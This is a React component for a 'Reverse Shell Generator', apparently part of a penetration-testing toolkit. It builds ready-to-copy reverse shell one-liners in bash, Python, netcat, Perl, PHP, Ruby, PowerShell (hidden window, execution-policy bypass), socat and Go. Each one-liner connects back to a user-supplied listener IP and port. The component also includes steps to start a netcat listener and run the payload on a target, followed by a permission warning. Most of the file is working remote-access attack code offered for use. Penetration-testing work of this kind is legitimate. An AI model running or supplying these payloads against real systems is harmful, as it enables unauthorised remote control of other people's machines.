import React, { useState } from 'react';
import styles from './Tool.module.css';

const ReverseShellGenerator: React.FC = () => {
  const [ip, setIp] = useState('10.10.10.10');
  const [port, setPort] = useState('4444');
  const [shellType, setShellType] = useState('bash');

  const shells = {
    bash: `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
    python: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`,
    nc: `nc -e /bin/sh ${ip} ${port}`,
    perl: `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
    php: `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    ruby: `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
    powershell: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
    socat: `socat TCP:${ip}:${port} EXEC:'/bin/bash'`,
    golang: `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${ip}:${port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go`,
  };

  const copyToClipboard = () => {
    navigator.clipboard.writeText(shells[shellType as keyof typeof shells]);
  };

  return (
    <div className={styles.tool}>
      <div className={styles.toolHeader}>
        <h2 className={styles.toolTitle}>
          <span className={styles.toolIcon}>🐚</span>
          Reverse Shell Generator
        </h2>
        <p className={styles.toolSubtitle}>Generate reverse shell payloads for penetration testing</p>
      </div>

      <div className={styles.toolContent}>
        <div className={styles.inputGroup}>
          <label>Listener IP Address</label>
          <input
            type="text"
            value={ip}
            onChange={(e) => setIp(e.target.value)}
            placeholder="10.10.10.10"
          />
        </div>

        <div className={styles.inputGroup}>
          <label>Listener Port</label>
          <input
            type="text"
            value={port}
            onChange={(e) => setPort(e.target.value)}
            placeholder="4444"
          />
        </div>

        <div className={styles.inputGroup}>
          <label>Shell Type</label>
          <select value={shellType} onChange={(e) => setShellType(e.target.value)}>
            <option value="bash">Bash</option>
            <option value="python">Python</option>
            <option value="nc">Netcat</option>
            <option value="perl">Perl</option>
            <option value="php">PHP</option>
            <option value="ruby">Ruby</option>
            <option value="powershell">PowerShell</option>
            <option value="socat">Socat</option>
            <option value="golang">Golang</option>
          </select>
        </div>

        <div className={styles.outputSection}>
          <div className={styles.outputHeader}>
            <label>Generated Payload</label>
            <button onClick={copyToClipboard} className={styles.copyBtn}>
              Copy
            </button>
          </div>
          <pre className={styles.output}>
            {shells[shellType as keyof typeof shells]}
          </pre>
        </div>

        <div className={styles.infoBox}>
          <h3>Usage Instructions</h3>
          <ol>
            <li>Set up listener: <code>nc -lvnp {port}</code></li>
            <li>Execute payload on target system</li>
            <li>Receive connection on your listener</li>
          </ol>
          <p className={styles.warning}>⚠️ Only use on systems you own or have permission to test</p>
        </div>
      </div>
    </div>
  );
};

export default ReverseShellGenerator;
